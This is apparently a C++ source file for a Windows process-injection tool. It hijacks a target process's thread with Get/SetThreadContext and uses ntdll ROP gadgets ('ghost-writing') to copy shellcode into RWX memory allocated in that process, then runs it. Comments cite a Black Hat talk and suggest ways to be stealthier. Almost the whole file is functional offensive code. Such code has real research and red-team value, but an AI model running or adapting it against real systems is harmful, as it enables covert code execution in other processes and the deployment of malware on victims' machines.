/**
* Injects shellcode into every thread of a process using Get/SetThreadContext. Writes the payload using the ghost-writing (ROP based) technique.
* The current implementation uses VirtualAllocEx to allocate executable memory for the shellcode. 
* This could be furhter improved by writing the payload onto the stack and calling VirtualProtect using a ROP chain to make the stack executable.
* Supports 32- and 64 Bit applications.
* The hijacked thread may require the target application to be focused to execute
* Based on: https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf
*/

#include <Windows.h>
#include <tlhelp32.h>
#include <vector>

#include "../payload/shellcode.hpp"

#ifdef _WIN64
#define Xip Rip
#else
#define Xip Eip
#endif

// from https://github.com/frk1/PolandCheater-perfecthook/blob/master/PerfectHook/Utilities.cpp
BYTE* FindBytePattern(const char* module, const char* signature)
{
	static auto ConvertPatternToBytes = [](const char* pattern)
	{
		std::vector<int> bytes = std::vector<int>{};
		char* start = const_cast<char*>(pattern);
		char* end = const_cast<char*>(pattern) + strlen(pattern);

		for (char* current = start; current < end; ++current)
		{
			if (*current == '?')
			{
				++current;
				if (*current == '?')
				{
					++current;
				}
				bytes.push_back(-1);
			}
			else
			{
				bytes.push_back(strtoul(current, &current, 16));
			}
		}
		return bytes;
	};

	BYTE* moduleBaseAddress = (BYTE*)GetModuleHandleA(module);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBaseAddress;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((std::uint8_t*)moduleBaseAddress + dosHeader->e_lfanew);

	auto sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
	auto patternBytes = ConvertPatternToBytes(signature);
	uint8_t* currentAddress = reinterpret_cast<uint8_t*>(moduleBaseAddress);

	int patternSize = patternBytes.size();
	int* patternData = patternBytes.data();

	for (int i = 0; i < sizeOfImage - patternSize; ++i)
	{
		bool found = true;
		for (int j = 0; j < patternSize; ++j)
		{
			if (currentAddress[i + j] != patternData[j] && patternData[j] != -1)
			{
				found = false;
				break;
			}
		}
		if (found)
		{
			return &currentAddress[i];
		}
	}
	return nullptr;
}

bool ExecutePayload(HANDLE threadHandle, BYTE* remoteMemory)
{
	if (SuspendThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to suspend thread\n", GetLastError());
		return false;
	}

	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(threadHandle, &ctx))
	{
		printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
		return false;
	}

	printf("[Info] - Executing payload at %p\n", remoteMemory);

	ctx.Xip = (DWORD_PTR)remoteMemory;

	if (SetThreadContext(threadHandle, &ctx) == 0)
	{
		printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
		return false;
	}

	if (ResumeThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to resume thread\n", GetLastError());
		return false;
	}
}

bool WriteLoopGadgetToStack(HANDLE threadHandle, BYTE* remoteMemory, BYTE* writeGadget, BYTE* endlessLoopGadget)
{
	if (SuspendThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to suspend thread\n", GetLastError());
		return false;
	}

	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(threadHandle, &ctx))
	{
		printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
		return false;
	}

	printf("[Info] - Writing loop gadget to fake stack");

#ifdef _WIN64
	DWORD_PTR fakeStack = ctx.Rsp - 0x400;

	// write gadget
	// volatile registers won't be set by SetContextThread (https://stackoverflow.com/questions/25004311/setthreadcontext-x64-volatile-registers)
	// registers set are: Rbx, Rsp, Rbp, Rsi, Rdi, R12 - R15, Xmm6 - Xmm15
	// https://stackoverflow.com/questions/25004311/setthreadcontext-x64-volatile-registers in x64 only setting no volatile works
	
	// write gadget ntdll
	//.text:0000000180082733	mov [rbx], r14
	//.text:0000000180082736	mov rbx, [rsp + 28h + arg_0]
	//.text:000000018008273B	add rsp, 20h
	//.text:000000018008273F	pop r14
	//.text:0000000180082741	retn
	ctx.Rip = (DWORD_PTR)writeGadget;
	ctx.Rbx = fakeStack;
	ctx.R14 = (DWORD_PTR)endlessLoopGadget;

	// - 0x28 to correct for add rsp, 0x20 and pop r14 in the gadget 
	ctx.Rsp = fakeStack - 0x28;
#else 
	DWORD_PTR fakeStack = ctx.Esp - 0x400;

	// write gadget
	// 89 11	mov[ecx], edx; ret
	ctx.Eip = (DWORD_PTR)writeGadget;
	ctx.Ecx = fakeStack;
	ctx.Edx = (DWORD_PTR)endlessLoopGadget;
	ctx.Esp = fakeStack;
#endif

	if (SetThreadContext(threadHandle, &ctx) == 0)
	{
		printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
		return false;
	}

	if (ResumeThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to resume thread\n", GetLastError());
		return false;
	}
}

bool WriteShellcode(HANDLE threadHandle, BYTE* remoteMemory, BYTE* writeGadget, BYTE* endlessLoopGadget)
{
	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;

	// check if hijacked thread has executed last write and is now at the infinity loop
	do
	{
		printf(".");
		Sleep(100);
		GetThreadContext(threadHandle, &ctx);
	} while (ctx.Xip != (DWORD_PTR)endlessLoopGadget);

	printf("done.\n");
	printf("[Info] - Writing shellcode\n");

	for (int i = 0; i < sizeof(shellcode) / sizeof(void*) + 1; i++)
	{
		if (SuspendThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to suspend thread\n", GetLastError());
			return false;
		}

		if (!GetThreadContext(threadHandle, &ctx))
		{
			printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
			return false;
		}

#ifdef _WIN64
		// write gadget ntdll
		//.text:0000000180082733	mov [rbx], r14
		//.text:0000000180082736	mov rbx, [rsp + 28h + arg_0]
		//.text:000000018008273B	add rsp, 20h
		//.text:000000018008273F	pop r14
		//.text:0000000180082741	retn
		ctx.Xip = (DWORD_PTR)writeGadget;
		ctx.R14	= (DWORD_PTR)((DWORD_PTR*)shellcode)[i];
		ctx.Rbx = (DWORD_PTR)((DWORD_PTR*)remoteMemory + i); // 

		// set Rsp to loop gadget
		// this offset is static because we execute one ret instruction per write (- sizeof(void*)) and the -0x28 is due to the gadget increasing the stack by 0x28
		ctx.Rsp = ctx.Rsp - 0x28 - sizeof(void*);

		printf("\t\"%p\" to % p\n", ctx.R14, ctx.Rbx);
#else 
		// write gadget
		// mov[ecx], edx; ret
		ctx.Xip = (DWORD_PTR)writeGadget;
		ctx.Edx = (DWORD_PTR)((DWORD_PTR*)shellcode)[i];
		ctx.Ecx = (DWORD_PTR)((DWORD_PTR*)remoteMemory + i); // 

		// set Esp to loop gadget
		// this offset is static because we execute one ret instruction per write (- sizeof(void*))
		ctx.Esp = ctx.Esp - sizeof(void*);
#endif

		if (SetThreadContext(threadHandle, &ctx) == 0)
		{
			printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
			return false;
		}
		
		if (ResumeThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to resume thread\n", GetLastError());
			return false;
		}

		do
		{
			// check if hijacked thread has executed last write operation and is now stuck in the endless loop gadget
			Sleep(10);
			GetThreadContext(threadHandle, &ctx);
		} while (ctx.Xip != (DWORD_PTR)endlessLoopGadget);
	}
	return true;
}

int main(int argc, char* argv[])
{
	const char* processName = "notepad.exe";

	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}

	processName = argv[1];

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("[Error] %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;
	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("[Error] - Failed to find process: %s\n", processName);
		return 1;
	}

	// jmp	0x0
	BYTE* endlessLoopGadget = FindBytePattern("ntdll.dll", "EB FE");
	if (!endlessLoopGadget)
	{
		printf("[Error] - Failed to find infinit loop in ntdll\n");
		return 1;
	}

#ifdef _WIN64
	// write gadget ntdll
	//.text:0000000180082733	mov [rbx], r14
	//.text:0000000180082736	mov rbx, [rsp + 28h + arg_0]
	//.text:000000018008273B	add rsp, 20h
	//.text:000000018008273F	pop r14
	//.text:0000000180082741	retn
	BYTE* writeGadget = FindBytePattern("ntdll.dll", "4C 89 73 08 4C 89 33") + 4;
	if (!writeGadget)
	{
		printf("[Error] - Failed to find write gadget in ntdll\n");
		return 1;
	}
#else 
	// 89 11	mov[ecx], edx
	// C3		retn
	BYTE* writeGadget = FindBytePattern("ntdll.dll", "89 11 C3");
	if (!writeGadget)
	{
		printf("[Error] - Failed to find write gadget in ntdll\n");
		return 1;
	}
#endif

	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	// to be stealthier one would use a ROP chain for example to call VirtualProtect and make the stack executable
	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	// get first thread of snapshot
	THREADENTRY32 currentThreadEntry = { sizeof(THREADENTRY32) };
	if (!Thread32First(processesSnapshot, &currentThreadEntry))
	{
		printf("[Error] %d - Failed to Thread32First\n", GetLastError());
		return 1;
	}

	// find to thread in the target processes and execute code by changing its CONTEXT
	do
	{
		if (currentThreadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
		{
			HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, currentThreadEntry.th32ThreadID);
			if (!threadHandle)
			{
				printf("[Warning] - Failed to acquire thread handle with error %d\n", GetLastError());
				continue;
			}

			WriteLoopGadgetToStack(threadHandle, (BYTE*)remoteMemory, writeGadget, endlessLoopGadget);
			WriteShellcode(threadHandle, (BYTE*)remoteMemory, writeGadget, endlessLoopGadget);
			ExecutePayload(threadHandle, (BYTE*)remoteMemory);
			printf("[Info] - Resumed hijacked thread\n");

			CloseHandle(threadHandle);
			return 0;
		}
	} while (Thread32Next(processesSnapshot, &currentThreadEntry));

	return 0;
}